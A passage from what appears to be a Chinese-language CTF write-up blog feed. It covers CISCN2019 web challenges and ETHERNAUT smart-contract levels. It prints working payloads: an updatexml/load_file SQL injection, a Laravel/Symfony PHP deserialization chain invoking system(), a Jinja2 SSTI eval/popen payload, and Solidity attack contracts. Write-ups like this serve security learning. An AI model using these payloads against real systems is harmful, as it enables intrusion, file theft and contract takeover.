class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这道题奇怪的点在于，对user_name和phone都进行了很好的过滤，但是对address却只有一层转义</p><p>那么这个address就可以用来注入了</p><p>这里虽然被转义了，但是从代码中可以看到，修改后之前的地址也会保存下来，那么如果写入payload，那么在第二次修改的时候就可以出发报错注入。</p><p>payload;</p><blockquote><p>1’ where user_id=updatexml(1,concat(0x7e,(select substr(load_file(‘/flag.txt’),1,20)),0x7e),1)#</p><p>1’ where user_id=updatexml(1,concat(0x7e,(select substr(load_file(‘/flag.txt’),20,50)),0x7e),1)#</p></blockquote><p>这里读表读了半天没有flag，看了大佬博客才知道要load_file</p><h2 id="CISCN2019-总决赛-Day1-Web4-Laravel1"><a href="#CISCN2019-总决赛-Day1-Web4-Laravel1" class="headerlink" title="[CISCN2019 总决赛 Day1 Web4]Laravel1"></a>[CISCN2019 总决赛 Day1 Web4]Laravel1</h2><p>知识点：</p><ul><li>PHP反序列化</li></ul><p>单纯的反序列化，就是项目挺大，找POP链还是不太容易</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//backup in source.tar.gz</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params">\Illuminate\Http\Request $request</span>)</span>&#123;</span><br><span class="line">        $payload=$request-&gt;input(<span class="string">&quot;payload&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($payload))&#123;</span><br><span class="line">            highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            @unserialize($payload);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用Seay工具全局搜索<code>__destuct()</code>，需要找到一个有可变参数的<code>__destuct()</code>，最终在<code>TagAwareAdapter</code>类中找到</p><p><img src= "/img/loading.gif" data-lazy-src="4.png"></p><p>跟进<code>commit</code>函数</p><p><img src= "/img/loading.gif" data-lazy-src="4.png"></p><p>再跟进<code>invalidateTags([])</code></p><p><img src= "/img/loading.gif" data-lazy-src="5.png"></p><p>其他都很正常，但是<code>$this-&gt;pool-&gt;saveDeferred($item)</code>这里，调用了外部类的方法，搜索一下<code>$this-&gt;pool。</code></p><p><img src= "/img/loading.gif" data-lazy-src="6.png"></p><p>可以看到这个类需要实现<code>AdapterInterface</code>接口，我们直接全局搜索<code>saveDeferred</code>函数，然后通过是否有<code>AdapterInterface</code>接口来进行排除，就剩下不多了，在通过有无利用点，确定了<code>ProxyAdapter</code>这个类，在这个类中找<code>saveDeferred</code></p><p><img src= "/img/loading.gif" data-lazy-src="7.png"></p><p>然后跟进<code>doSave</code></p><p><img src= "/img/loading.gif" data-lazy-src="8.png"></p><p>我们会惊奇的发现，这里是可以利用的。要利用的话就要保证<code>setInnerItem和innerItem</code>可控，<code>setInnerItem</code>就在类中，<code>innerItem</code>通过下面这个语句可以发现，我们需要给到一个有<code>innerItem</code>参数的类</p><p><img src= "/img/loading.gif" data-lazy-src="9.png"></p><p>继续全局搜索<code>innerItem</code>，然后确定了<code>CacheItem</code>类</p><p><img src= "/img/loading.gif" data-lazy-src="10.png"></p><p>接下来的事情就简单了，构造POC</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CacheItem</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $innerItem = <span class="string">&#x27;cat /flag&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProxyAdapter</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $setInnerItem = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TagAwareAdapter</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $deferred;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pool = <span class="keyword">new</span> ProxyAdapter();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> TagAwareAdapter();</span><br><span class="line">$a -&gt; deferred = <span class="keyword">array</span>(<span class="string">&#x27;hack&#x27;</span> =&gt; <span class="keyword">new</span> \Symfony\Component\Cache\CacheItem);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure><p>然后发送payload就可以<code>getflag</code></p><h2 id="CISCN2019-华东南赛区-Double-Secret"><a href="#CISCN2019-华东南赛区-Double-Secret" class="headerlink" title="[CISCN2019 华东南赛区]Double Secret"></a>[CISCN2019 华东南赛区]Double Secret</h2><p>知识点：</p><ul><li>Flask SSTI</li><li>RC4解密</li></ul><p><img src= "/img/loading.gif" data-lazy-src="11.png"></p><p>根据这里猜测有<code>secret</code>页面</p><p><img src= "/img/loading.gif" data-lazy-src="12.png"></p><p>果然，然后传参，没试出什么规律，然后乱打一通打出了报错</p><p><img src= "/img/loading.gif" data-lazy-src="13.png"></p><p>然后找到了加密的源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span>(secret==<span class="literal">None</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Tell me your secret.I will encrypt it so others can\&#x27;t see&#x27;</span></span><br><span class="line">    rc=rc4_Modified.RC4(<span class="string">&quot;HereIsTreasure&quot;</span>)   <span class="comment">#解密</span></span><br><span class="line">    deS=rc.do_crypt(secret)</span><br><span class="line"> </span><br><span class="line">    a=render_template_string(safe(deS))</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;ciscn&#x27;</span> <span class="keyword">in</span> a.lower():</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;flag detected!&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line">Open an interactive python shell <span class="keyword">in</span> this frame </span><br></pre></td></tr></table></figure><p>没想到还挺简单的，就是个RC4加密，密钥就是<code>HereIsTreasure</code>找个脚本</p><p>然后看到这里有个<code>render_template_string</code>，看不懂，但是有个template，觉得应该是跟模板有关，用SSTI的payload加密一下传上去</p><p>EXP：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_main</span>(<span class="params">key = <span class="string">&quot;init_key&quot;</span>, message = <span class="string">&quot;init_message&quot;</span></span>):</span><span class="comment">#返回加密后得内容</span></span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = str(rc4_excrypt(message, s_box))</span><br><span class="line">    <span class="keyword">return</span>  crypt</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_init_sbox</span>(<span class="params">key</span>):</span></span><br><span class="line">    s_box = list(range(<span class="number">256</span>)) </span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + ord(key[i % len(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_excrypt</span>(<span class="params">plain, box</span>):</span></span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(chr(ord(s) ^ k))</span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    <span class="keyword">return</span> (str(base64.b64encode(cipher.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;HereIsTreasure&quot;</span>  <span class="comment">#此处为密文</span></span><br><span class="line">message = input(<span class="string">&quot;请输入明文:\n&quot;</span>)</span><br><span class="line">enc_base64 = rc4_main( key , message )</span><br><span class="line">enc_init = str(base64.b64decode(enc_base64),<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">enc_url = parse.quote(enc_init)</span><br><span class="line">print(<span class="string">&quot;rc4加密后的url编码:&quot;</span>+enc_url)</span><br><span class="line"><span class="comment">#print(&quot;rc4加密后的base64编码&quot;+enc_base64)</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].eval(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag.txt&#x27;).read()&quot;</span>)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;刷题记录&lt;/p&gt;</summary>
    
    
    
    <category term="WP" scheme="http://yoursite.com/categories/WP/"/>
    
    
  </entry>
  
  <entry>
    <title>智能合约安全入门:ETHERNAUT-WriteUp(3)</title>
    <link href="http://yoursite.com/2020/05/17/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8-ETHERNAUT-WriteUp-3/"/>
    <id>http://yoursite.com/2020/05/17/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8-ETHERNAUT-WriteUp-3/</id>
    <published>2020-05-17T08:14:14.000Z</published>
    <updated>2020-07-18T07:04:00.379Z</updated>
    
    <content type="html"><![CDATA[<p>本来说下次一定（咕咕咕），突然周天又没啥事情，干脆做完好了。</p><a id="more"></a><h2 id="0x00-Naught-Coin"><a href="#0x00-Naught-Coin" class="headerlink" title="0x00 Naught Coin"></a>0x00 Naught Coin</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;zeppelin-solidity/contracts/token/ERC20/StandardToken.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line"> contract NaughtCoin is StandardToken &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath <span class="keyword">for</span> uint256;</span><br><span class="line">  string public constant name = <span class="string">&#x27;NaughtCoin&#x27;</span>;</span><br><span class="line">  string public constant symbol = <span class="string">&#x27;0x0&#x27;</span>;</span><br><span class="line">  uint public constant decimals = <span class="number">18</span>;</span><br><span class="line">  uint public timeLock = now + <span class="number">10</span> years;</span><br><span class="line">  uint public INITIAL_SUPPLY = (<span class="number">10</span> ** decimals).mul(<span class="number">1000000</span>);</span><br><span class="line">  address public player;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">NaughtCoin</span>(<span class="params">address _player</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    player = _player;</span><br><span class="line">    totalSupply_ = INITIAL_SUPPLY;</span><br><span class="line">    balances[player] = INITIAL_SUPPLY;</span><br><span class="line">    Transfer(<span class="number">0x0</span>, player, INITIAL_SUPPLY);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">transfer</span>(<span class="params">address _to, uint256 _value</span>) <span class="title">lockTokens</span> <span class="title">public</span> <span class="title">returns</span>(<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">super</span>.transfer(_to, _value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Prevent the initial owner from transferring tokens until the timelock has passed</span></span><br><span class="line">  modifier lockTokens() &#123;</span><br><span class="line">    <span class="keyword">if</span> (msg.sender == player) &#123;</span><br><span class="line">      <span class="built_in">require</span>(now &gt; timeLock);</span><br><span class="line">      _;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     _;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>这道题题目说明：</p><blockquote><p>NaughtCoin is an ERC20 token and you’re already holding all of them. The catch is that you’ll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.</p><p> Things that might help</p><ul><li>The <a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md">ERC20</a> Spec</li><li>The <a href="https://github.com/OpenZeppelin/zeppelin-solidity/tree/master/contracts">OpenZeppelin</a> codebase</li></ul></blockquote><p>给了框架源码和接口文档，源码是不可能去看的（懒），看看接口。</p><p>这道题的目的是置0自己的<code>token balance</code>，合约里面有一个<code>transfer</code>函数，但是有一个<code>modifier</code>做限制，10年之后才能转出去，drl。</p><p>接口文档中除了有<code>transfer</code>函数之外，还有一个<code>transferFrom</code>，这个函数合约中没有实现，所以直接调用就可以绕过<code>modifier</code>。</p><p><img src= "/img/loading.gif" data-lazy-src="1.png"></p><p>但是这个<code>transferFrom</code>需要授权。接着往下看就找到了可以用的一个方法：<code>approve</code></p><p><img src= "/img/loading.gif" data-lazy-src="2.png"></p><p>然后就很清晰了，先授权，再转账</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">contract.approve(player,<span class="number">1000000000000000000000000</span>)</span><br><span class="line"></span><br><span class="line">contract.transferFrom(player,contract.address,<span class="number">1000000000000000000000000</span>)</span><br></pre></td></tr></table></figure><h2 id="0x01-Preservation"><a href="#0x01-Preservation" class="headerlink" title="0x01 Preservation"></a>0x01 Preservation</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.23</span>;</span><br><span class="line"></span><br><span class="line">contract Preservation &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// public library contracts </span></span><br><span class="line">  address public timeZone1Library;</span><br><span class="line">  address public timeZone2Library;</span><br><span class="line">  address public owner; </span><br><span class="line">  uint storedTime;</span><br><span class="line">  <span class="comment">// Sets the function signature for delegatecall</span></span><br><span class="line">  bytes4 constant setTimeSignature = bytes4(keccak256(<span class="string">&quot;setTime(uint256)&quot;</span>));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">constructor</span>(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public &#123;</span><br><span class="line">    timeZone1Library = _timeZone1LibraryAddress; </span><br><span class="line">    timeZone2Library = _timeZone2LibraryAddress; </span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// set the time for timezone 1</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">setFirstTime</span>(<span class="params">uint _timeStamp</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    timeZone1Library.delegatecall(setTimeSignature, _timeStamp);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// set the time for timezone 2</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">setSecondTime</span>(<span class="params">uint _timeStamp</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    timeZone2Library.delegatecall(setTimeSignature, _timeStamp);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Simple library contract to set the time</span></span><br><span class="line">contract LibraryContract &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// stores a timestamp </span></span><br><span class="line">  uint storedTime;  </span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">setTime</span>(<span class="params">uint _time</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    storedTime = _time;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题需要改变owner，但是这里好像没有什么可以控制owner的地方，根据给出的提示，在<code>delegatecall</code>上面思考，之前提到了<code>delegatecall</code>的特性，他的一个重要的地方就是，当一个合约调用另外一个合约中的方法时，所使用的<code> storage</code>会是调用方的<code> storage</code>，这样的一个特性就可以用来解这道题目。</p><p>首先，这里<code>Preservation</code>合约的<code>setFirstTime</code>中调用了<code>LibraryContract</code>中的方法，这时，<code>setTime</code>函数中给<code>storedTime</code>赋值，但由于上文提到的特性，在实际存储上修改的是<code>timeZone1Library</code>的值。</p><p>所以攻击思路就清晰了，首先调用<code>setFirstTime</code>来将攻击合约的地址赋值给<code>timeZone1Library</code>，然后再次调用<code>setFirstTime</code>去执行攻击代码。</p><p>攻击合约代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">contract attack&#123;</span><br><span class="line">    address public timeZone1Library;</span><br><span class="line">    address public timeZone2Library;</span><br><span class="line">    address public owner;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setTime</span>(<span class="params">uint _time</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        timeZone1Library = address(_time);</span><br><span class="line">        timeZone2Library = address(_time);</span><br><span class="line">        owner=address(_time);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是我没有成功，讲道理，不知道为什么，方法应该是没有问题的。</p><h2 id="0x02-Locked"><a href="#0x02-Locked" class="headerlink" title="0x02 Locked"></a>0x02 Locked</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.23</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">// A Locked Name Registrar</span></span><br><span class="line">contract Locked &#123;</span><br><span class="line"></span><br><span class="line">    bool public unlocked = <span class="literal">false</span>;  <span class="comment">// registrar locked, no name updates</span></span><br><span class="line">    </span><br><span class="line">    struct NameRecord &#123; <span class="comment">// map hashes to addresses</span></span><br><span class="line">        bytes32 name; <span class="comment">// </span></span><br><span class="line">        address mappedAddress;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mapping(<span class="function"><span class="params">address</span> =&gt;</span> NameRecord) public registeredNameRecord; <span class="comment">// records who registered names </span></span><br><span class="line">    mapping(<span class="function"><span class="params">bytes32</span> =&gt;</span> address) public resolve; <span class="comment">// resolves hashes to addresses</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params">bytes32 _name, address _mappedAddress</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="comment">// set up the new NameRecord</span></span><br><span class="line">        NameRecord newRecord;</span><br><span class="line">        newRecord.name = _name;</span><br><span class="line">        newRecord.mappedAddress = _mappedAddress; </span><br><span class="line"></span><br><span class="line">        resolve[_name] = _mappedAddress;</span><br><span class="line">        registeredNameRecord[msg.sender] = newRecord; </span><br><span class="line"></span><br><span class="line">        <span class="built_in">require</span>(unlocked); <span class="comment">// only allow registrations if contract is unlocked</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;本来说下次一定（咕咕咕），突然周天又没啥事情，干脆做完好了。&lt;/p&gt;</summary>
    
    
    
    <category term="BlockChain" scheme="http://yoursite.com/categories/BlockChain/"/>
    
    
    <category term="区块链" scheme="http://yoursite.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    <category term="solidity" scheme="http://yoursite.com/tags/solidity/"/>
    
  </entry>
  
  <entry>
    <title>智能合约安全入门:ETHERNAUT-WriteUp(2)</title>
    <link href="http://yoursite.com/2020/05/16/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%85%A5%E9%97%A8-ETHERNAUT-WriteUp-2/"/>
    <id>http://yoursite.com/2020/05/16/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%85%A5%E9%97%A8-ETHERNAUT-WriteUp-2/</id>
    <published>2020-05-16T10:35:20.000Z</published>
    <updated>2020-05-16T13:25:27.414Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-King"><a href="#0x00-King" class="headerlink" title="0x00 King"></a>0x00 King</h2><a id="more"></a><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;zeppelin-solidity/contracts/ownership/Ownable.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract King is Ownable &#123;</span><br><span class="line"></span><br><span class="line">  address public king;</span><br><span class="line">  uint public prize;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">King</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">external</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.value &gt;= prize || msg.sender == owner);</span><br><span class="line">    king.transfer(msg.value);</span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题目标是阻止其他人成为King，先看看合约的逻辑，非常简单，价高者为King，而且会将前任King的钱退回去。</p><p>这里的漏洞点应该在transfer函数，查阅手册后我们知道，transfer函数在失败后会抛出错误并进行回滚，那如果我们在这一步一直抛出错误，代码就进行不下去，其他人也就无法成为King。</p><p>那就构造一个合约来完成，在收到转账时，默认会调用callback函数，看来我们需要再callback上下文章，我们让callback直接抛出错误，这样就可以达成目标。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract attack &#123;</span><br><span class="line">   address to = <span class="number">0x899c36c7b5ae649ee646868a042cb479dde98da0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">pay</span>(<span class="params"></span>) <span class="title">payable</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">sendto</span>(<span 